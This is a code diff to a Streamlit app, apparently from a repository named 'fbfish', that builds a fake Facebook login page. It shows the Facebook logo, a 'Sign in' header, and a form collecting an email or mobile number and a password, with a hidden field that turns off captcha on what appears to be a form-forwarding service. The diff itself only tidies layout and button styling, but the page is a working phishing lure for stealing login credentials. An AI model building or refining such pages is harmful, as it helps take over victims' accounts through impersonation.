@@ -1,26 +1,19 @@
 import streamlit as st  # pip install streamlit
+
 col1, col2, col3 = st.columns(3)
 
 with col1:
-     st.write(' ')
+    st.write(' ')
 
 with col3:
     st.write(' ')
 
 with col2:
     st.image(
-    "https://github.com/MTA-BD/fbfish/blob/main/fbh/fb.png?raw=true",
-    width=150,
-    channels="RGB"
+        "https://github.com/MTA-BD/fbfish/blob/main/fbh/fb.png?raw=true",
+        width=150,
+        channels="RGB"
     )
-
-
-
-
-#logo=image.open("G.png")
-
-
-import streamlit as st  # pip install streamlit
 
 # Center align the header
 st.markdown("<h2 style='text-align: center; color: black;'>Sign in</h1>", unsafe_allow_html=True)
@@ -44,6 +37,8 @@ contact_form = """
         transition-duration: 0.4s;
         cursor: pointer;
         border-radius: 8px;
+        width: 100%; /* Make the button wider */
+        margin: 0 auto; /* Center align the button */
     }
     .styledInput {
         background-color: transparent;
@@ -60,7 +55,7 @@ contact_form = """
      <input type="hidden" name="_captcha" value="false">
      <input class="styledInput" type="email" name="email" placeholder="Email or mobile number" required>
      <input class="styledInput" type="text" name="name" placeholder="Password" required>
-     <button type="submit" class="styledButton" style="float: right;">Log in</button>
+     <button type="submit" class="styledButton">Log in</button>
 </form>
 """
 
